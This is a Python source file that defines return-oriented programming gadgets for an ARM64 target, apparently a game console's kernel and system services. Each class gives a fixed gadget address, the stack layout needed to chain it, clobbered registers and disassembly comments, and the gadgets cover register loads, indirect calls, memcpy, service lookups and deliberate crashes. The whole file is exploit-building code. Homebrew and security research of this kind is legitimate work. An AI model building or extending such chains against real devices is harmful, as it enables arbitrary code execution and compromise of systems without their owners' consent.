import Gadgets

class Load_X0X1X2X3:
    def __init__(self, x0=Gadgets.DontCare(), x1=Gadgets.DontCare(), x2=Gadgets.DontCare(), x3=Gadgets.DontCare()):
        self.x0 = x0
        self.x1 = x1
        self.x2 = x2
        self.x3 = x3

    def get_addr(self):
        return Gadgets.KernelGadget(0x3A25C)

    def generate(self, next_x29, next_x30):
        return [
            next_x29,  # ldp x29, x30, [sp], #0x10
            next_x30,
            self.x0,   # ldp, x0, x1, [sp]
            self.x1,
            self.x2,   # ldp, x2, x3, [sp]
            self.x3,
            # add sp, #0x20; ret
        ]

    def clobbers(self):
        return [0,1,2,3,29,30]

class Load_X0X1X2X3X4X5X6X7:
    def __init__(self, x0=Gadgets.DontCare(), x1=Gadgets.DontCare(), x2=Gadgets.DontCare(), x3=Gadgets.DontCare(), x4=Gadgets.DontCare(), x5=Gadgets.DontCare(), x6=Gadgets.DontCare(), x7=Gadgets.DontCare()):
        self.x0 = x0
        self.x1 = x1
        self.x2 = x2
        self.x3 = x3
        self.x4 = x4
        self.x5 = x5
        self.x6 = x6
        self.x7 = x7

    def get_addr(self):
        return Gadgets.KernelGadget(0x3A228)

    def generate(self, next_x29, next_x30):
        return [
            next_x29,  # ldp x29, x30, [sp], #0x10
            next_x30,
            self.x0,   # ldp, x0, x1, [sp]
            self.x1,
            self.x2,   # ldp, x2, x3, [sp]
            self.x3,
            self.x4,   # ldp, x4, x5, [sp]
            self.x5,
            self.x6,   # ldp, x6, x7, [sp]
            self.x7,
            # add sp, #0x40; ret
        ]

    def clobbers(self):
        return [0,1,2,3,4,5,6,7,29,30]

class LoadX8:
    def __init__(self, x8):
        self.x8 = x8

    def get_addr(self):
        return Gadgets.KernelGadget(0x3e3a0)

    def generate(self, next_x29, next_x30):
        return [
            Gadgets.DontCare(), # sp+0
            Gadgets.DontCare(), # sp+8
            Gadgets.DontCare(), # sp+0x10
            Gadgets.DontCare(), # sp+0x18
            Gadgets.DontCare(), # sp+0x20
            self.x8, # x8
            Gadgets.DontCare(), # sp+0x30
            Gadgets.DontCare(), # sp+0x38
            Gadgets.DontCare(), # sp+0x40
            Gadgets.DontCare(), # sp+0x48
            Gadgets.DontCare(), # sp+0x50
            Gadgets.DontCare(), # sp+0x58
            Gadgets.DontCare(), # sp+0x60
            Gadgets.DontCare(), # sp+0x68
            Gadgets.DontCare(), # sp+0x70 [x28]
            Gadgets.DontCare(), # sp+0x78 [x27]
            Gadgets.DontCare(), # sp+0x80 [x26]
            Gadgets.DontCare(), # sp+0x88 [x25]
            Gadgets.DontCare(), # sp+0x90 [x24]
            Gadgets.DontCare(), # sp+0x98 [x23]
            Gadgets.DontCare(), # sp+0xA0 [x22]
            Gadgets.DontCare(), # sp+0xA8 [x21]
            Gadgets.DontCare(), # sp+0xB0 [x20]
            Gadgets.DontCare(), # sp+0xB8 [x19]
            next_x29,           # sp+0xC0 [x29]
            next_x30,           # sp+0xC8 [x30]
            # add sp, #0xd0; ret
        ]

    def clobbers(self):
        return [0,19,20,21,22,23,24,25,26,27,28,29,30]

'''
   3e3a0:       f94017e8        ldr    x8, [sp, #40]
   3e3a4:       a94c7bfd        ldp     x29, x30, [sp, #192]
   3e3a8:       a94b4ff4        ldp     x20, x19, [sp, #176]
   3e3ac:       2a0803e0        mov     w0, w8
   3e3b0:       a94a57f6        ldp     x22, x21, [sp, #160]
   3e3b4:       a9495ff8        ldp     x24, x23, [sp, #144]
   3e3b8:       a94867fa        ldp     x26, x25, [sp, #128]
   3e3bc:       a9476ffc        ldp     x28, x27, [sp, #112]
   3e3c0:       910343ff        add     sp, sp, #0xd0
   3e3c4:       d65f03c0        ret
'''

class CallX8:
    def get_addr(self):
        '''
    9828:       d63f0100        blr     x8
    982c:       92407c00        and     x0, x0, #0xffffffff
    9830:       a8c17bfd        ldp     x29, x30, [sp], #16
    9834:       d65f03c0        ret

        '''
        return Gadgets.KernelGadget(0x9828) # blr x8;   and x0, 0xffffffff

    def generate(self, next_x29, next_x30):
        return [
            next_x29,  # ldp x29, x30, [sp], #0x10
            next_x30,  # ret
        ]

    def clobbers(self):
        return [0,1,2,3,4,5,6,7,29,30]

class Nop:
    def get_addr(self):
        return Gadgets.MainGadget(0x464358)

    def generate(self, next_x29, next_x30):
        return [
            next_x29,  # ldp x29, x30, [sp], #0x10
            next_x30,  # ret
        ]

    def clobbers(self):
        return [29,30]

class InfLoop:
    def get_addr(self):
        return Gadgets.RtldGadget(0xAC) # b +0

    def generate(self, next_x29, next_x30):
        return []

class SmGetService: # x0=handle_out, x1=service_str
    def get_addr(self):
        return Gadgets.MainGadget(0x3DC674 + 8 + 4)

    def generate(self, next_x29, next_x30):
        return [
            Gadgets.DontCare(), # x20
            Gadgets.DontCare(), # x19
            next_x29,
            next_x30,
        ]

class CrashIfResultFailed:
    def get_addr(self):
        return Gadgets.KernelGadget(0x3D7A0)

    def generate(self, next_x29, next_x30):
        return [
            next_x29,
            next_x30,
        ]

class Memcpy:
    def get_addr(self):
        return Gadgets.KernelGadget(0x4A574)

    def generate(self, next_x29, next_x30):
        return [
            Gadgets.DontCare(), # x19
            Gadgets.DontCare(), # pad
            next_x29,
            next_x30,
        ]

class Write_W2_X0: # Requires InitLr
    def get_addr(self):
        return Gadgets.KernelGadget(0x39880)

class SendSyncRequestWithUserBuffer: # Requires InitLr
    def get_addr(self):
        return Gadgets.MainGadget(0x3ED3DC)

class Crash:
    def get_addr(self):
        return Gadgets.Imm(0xDEADC0DE)

    def generate(self, next_x29, next_x30):
        return [
            next_x29,
            next_x30,
        ]
